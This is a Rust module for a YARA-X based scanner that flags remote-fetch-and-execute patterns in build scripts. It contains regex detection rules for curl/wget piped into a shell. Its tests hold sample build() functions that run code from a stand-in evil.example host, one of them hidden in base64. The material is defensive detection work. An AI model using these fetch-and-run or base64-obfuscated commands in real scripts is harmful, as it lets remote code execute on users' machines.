use crate::normalizer::ScriptNormalizer;
use crate::types::{Category, Finding, Severity};
use crate:: Location;
use std::path::PathBuf;
use yara_x::{Compiler, Scanner};

#[derive(Debug, Clone, PartialEq)]
pub struct YaraFinding {
    pub rule_name: String,
    pub severity: String,
    pub description: String,
}

pub struct YaraAuditEngine {
    rules_src: String,
}

impl YaraAuditEngine {
    pub fn new() -> Self {
        let default_rules = r##"
rule AUR_Malicious_Process_Substitution {
    meta:
        severity = "Critical"
        description = "Detected process substitution redirected into shell execution or dynamic runner"
    strings:
        // Pola direct execution: bash < <(curl ...) atau $RUNNER < <(curl ...)
        $direct_sub = /(^|[;&|]\s*)((ba)?sh|\$\w+)\s*<\s*<\s*\((curl|wget)[^\)]+\)/

        // Pola pipeline normalisasi asli (bukan di dalam argumen kutip tunggal/ganda tertutup)
        $pipe_exec = /(^|[;&|]\s*)(curl|wget)[^"\n;]+\|\s*(\$\w+|(ba)?sh)(\s|$|[;&|])/
    condition:
        $direct_sub or $pipe_exec
}

rule AUR_Decoded_Payload_Network_Execution {
    meta:
        severity = "Critical"
        description = "Detected network execution payload inside obfuscated or decoded script"
    strings:
        $decoded_marker = "# [DECODED_INLINE_PAYLOAD]"
        $network_exec = /(curl|wget)[^\n;]+\|\s*(\$\w+|(ba)?sh)/
    condition:
        $decoded_marker and $network_exec
}
"##;
        Self {
            rules_src: default_rules.to_string(),
        }
    }

    pub fn with_custom_rules(custom_rules: &str) -> Self {
        Self {
            rules_src: custom_rules.to_string(),
        }
    }

    pub fn scan(&self, raw_content: &str) -> Result<Vec<YaraFinding>, String> {
        let normalized_buf = ScriptNormalizer::normalize(raw_content);

        let mut compiler = Compiler::new();
        compiler
            .add_source(self.rules_src.as_str())
            .map_err(|e| format!("Failed to compile YARA rules: {e}"))?;

        let compiled_rules = compiler.build();
        let mut scanner = Scanner::new(&compiled_rules);

        let scan_results = scanner
            .scan(normalized_buf.normalized.as_bytes())
            .map_err(|e| format!("YARA scan execution failed: {e}"))?;

        let mut findings = Vec::new();

        for matching_rule in scan_results.matching_rules() {
            let mut severity = "Medium".to_string();
            let mut description = "Suspicious pattern matched".to_string();

            for (meta_name, meta_val) in matching_rule.metadata() {
                if meta_name == "severity" {
                    if let yara_x::MetaValue::String(s) = meta_val {
                        severity = s.to_string();
                    }
                }
                if meta_name == "description" {
                    if let yara_x::MetaValue::String(s) = meta_val {
                        description = s.to_string();
                    }
                }
            }

            findings.push(YaraFinding {
                rule_name: matching_rule.identifier().to_string(),
                severity,
                description,
            });
        }

        Ok(findings)
    }

    pub fn scan_as_findings(&self, raw_content: &str, target_path: &str) -> Vec<Finding> {
        let mut results = Vec::new();
        if let Ok(yara_findings) = self.scan(raw_content) {
            for yf in yara_findings {
                let sev = match yf.severity.as_str() {
                    "Critical" => Severity::Critical,
                    "High" => Severity::High,
                    "Medium" => Severity::Medium,
                    _ => Severity::Low,
                };

                let finding = Finding {
                    id: yf.rule_name.clone(),
                    severity: sev,
                    category: Category::CommandInjection,
                    title: format!("YARA-X Match: {}", yf.rule_name),
                    description: yf.description,
                    location: Location {
                        file: PathBuf::from(target_path),
                        line: None,
                        column: None,
                        snippet: None,
                    },
                    recommendation: "Inspect script for unauthorized network command execution or obfuscated base64 payloads.".to_string(),
                    cwe_id: Some("CWE-78".to_string()),
                    metadata: serde_json::json!({ "engine": "yara-x" }),
                };

                results.push(finding);
            }
        }
        results
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_yara_detects_normalized_process_sub() {
        let engine = YaraAuditEngine::new();
        let payload = r#"
build() {
    bash < <(curl -fsSL https://evil.example/script.sh)
}
"#;
        let findings = engine.scan(payload).expect("scan should succeed");
        assert!(!findings.is_empty(), "Harus ada finding YARA");
        assert_eq!(findings[0].rule_name, "AUR_Malicious_Process_Substitution");
        assert_eq!(findings[0].severity, "Critical");
    }

    #[test]
    fn test_yara_detects_decoded_base64_payload() {
        let engine = YaraAuditEngine::new();
        let payload = r#"
build() {
    echo "Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS9zY3JpcHQuc2ggfCBiYXNo" | base64 -d | sh
}
"#;
        let findings = engine.scan(payload).expect("scan should succeed");
        assert!(!findings.is_empty(), "Harus mendeteksi payload hasil decode");
        assert!(findings
            .iter()
            .any(|f| f.rule_name == "AUR_Decoded_Payload_Network_Execution"));
    }
}